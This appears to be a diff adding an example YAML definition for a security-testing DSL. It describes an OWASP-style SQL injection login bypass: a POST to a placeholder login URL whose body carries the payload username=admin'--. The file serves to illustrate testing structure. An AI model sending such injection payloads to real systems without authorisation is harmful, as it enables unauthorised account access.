@@ -1,0 +1,14 @@
+# Example: SQLi login bypass (OWASP-style)
+# Phase 1 DSL — structure only; execution in later phases.
+
+name: "SQLi login bypass"
+description: "Attempt SQL injection on login form"
+type: sqli
+
+steps:
+  - name: "Send malicious payload"
+    method: POST
+    url: "https://example.com/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=admin'--&password=any"
